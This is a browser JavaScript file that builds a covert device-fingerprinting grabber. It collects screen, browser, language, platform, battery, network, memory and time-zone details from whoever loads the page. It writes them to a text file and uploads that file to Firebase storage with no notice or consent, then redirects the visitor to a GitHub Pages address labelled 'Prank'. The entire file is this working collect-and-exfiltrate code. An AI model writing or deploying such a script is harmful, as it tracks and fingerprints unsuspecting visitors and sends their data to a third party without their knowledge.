        async function trackBatteryInfo() {
    if (!navigator.getBattery) {
        console.log("Battery API not supported");
        return;
    }

    const battery = await navigator.getBattery();
    
    // Function to log battery info
    function logBatteryInfo() {
        console.log(`Battery Level: ${(battery.level * 100).toFixed(0)}%`);
        console.log(`Charging: ${battery.charging ? "Yes" : "No"}`);
        console.log(`Charging Time: ${battery.chargingTime} seconds`);
        console.log(`Discharging Time: ${battery.dischargingTime} seconds`);
    }

    // Log initial battery info
    logBatteryInfo();

    // Update info whenever charging status or level changes
    battery.addEventListener('chargingchange', logBatteryInfo);
    battery.addEventListener('levelchange', logBatteryInfo);
    battery.addEventListener('chargingtimechange', logBatteryInfo);
    battery.addEventListener('dischargingtimechange', logBatteryInfo);
}
trackBatteryInfo();

        function trackNetworkInfo() {
    if (!navigator.connection) {
        console.log("Network API not supported");
        return;
    }

    const connection = navigator.connection;

    // Function to log network info
    function logNetworkInfo() {
        console.log("Network Type:", connection.effectiveType);
        console.log("Downlink Speed:", connection.downlink + " Mbps");
        console.log("RTT:", connection.rtt + " ms");
        console.log("Data Saver Mode:", connection.saveData ? "Enabled" : "Disabled");
    }

    // Initial log
    logNetworkInfo();

    // Listen for network changes
    connection.addEventListener('change', logNetworkInfo);
}
trackNetworkInfo();

async function collectAndUploadData() {
    logMessage('Starting automatic data collection...');

    // Collecting advanced info
    const deviceInfo = {
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        aspectRatio: (window.screen.width / window.screen.height).toFixed(2),
        browser: navigator.userAgent.match(/(firefox|msie|trident|chrome|safari|opera|edg)/gi)?.[0] || "Unknown",
        browserVersion: navigator.userAgent.match(/(?:firefox|msie|trident|chrome|safari|opera|edg)[\/\s]?(\d+)/i)?.[1] || "Unknown",
        language: navigator.languages ? navigator.languages.join(', ') : navigator.language,
        platform: navigator.platform,
        cookiesEnabled: navigator.cookieEnabled
    };

    logMessage('Device info collected:');
    logMessage(JSON.stringify(deviceInfo, null, 2));

    // Battery information collection
    let batteryInfo = {};
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            batteryInfo = {
                level: (battery.level * 100).toFixed(0) + '%',
                charging: battery.charging ? "Yes" : "No",
                chargingTime: battery.chargingTime ? battery.chargingTime + " seconds" : "N/A",
                dischargingTime: battery.dischargingTime ? battery.dischargingTime + " seconds" : "N/A"
            };
        } catch (error) {
            logMessage("Battery info not available:", error.message);
        }
    }

    // Network information collection
    const networkInfo = navigator.connection ? {
        networkType: navigator.connection.effectiveType,
        downlinkSpeed: navigator.connection.downlink + " Mbps",
        rtt: navigator.connection.rtt + " ms",
        dataSaver: navigator.connection.saveData ? "Enabled" : "Disabled"
    } : { error: "Network API not supported" };

    // Memory information collection
    const memoryInfo = navigator.deviceMemory || 4; // Default to 4GB if undefined

    // Locale and time zone information
    const localeInfo = {
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        currentDate: new Intl.DateTimeFormat(navigator.language, { dateStyle: 'full' }).format(new Date()),
        currentTime: new Intl.DateTimeFormat(navigator.language, { timeStyle: 'medium' }).format(new Date()),
        weekday: new Intl.DateTimeFormat(navigator.language, { weekday: 'long' }).format(new Date())
    };

    logMessage('Battery Info:', JSON.stringify(batteryInfo, null, 2));
    logMessage('Network Info:', JSON.stringify(networkInfo, null, 2));
    logMessage('Memory Info:', memoryInfo + ' GB');
    logMessage('Locale Info:', JSON.stringify(localeInfo, null, 2));

    // Combined data object in single JSON structure
    const data = {
        deviceInfo,
        batteryInfo,
        networkInfo,
        memoryInfo: `${memoryInfo} GB`,
        localeInfo
    };

    logMessage('Data collection complete.');

    // Convert the data to a single string for one-file upload
    const dataString = JSON.stringify(data, null, 2);
    logMessage('Preparing data for upload...');

    try {
        const blob = new Blob([dataString], { type: 'text/plain' });
        logMessage('.txt file created successfully.');

        // Create a unique file name using timestamp
        const timestamp = new Date().getTime();
        const fileName = `complete_device_info_${timestamp}.txt`;

        logMessage(`Uploading .txt file (${fileName}) to Firebase...`);

        // Firebase storage reference for the new file
        const storageRef = ref(storage, `device_info/${fileName}`);

        // Upload the file to Firebase
        await uploadBytes(storageRef, blob);
        logMessage('File uploaded successfully to Firebase!');

        // Redirect after successful upload
        window.location.href = "https://high-hub.github.io/Prank/";

    } catch (error) {
        logMessage('Error during file upload: ' + error.message);
    }
}
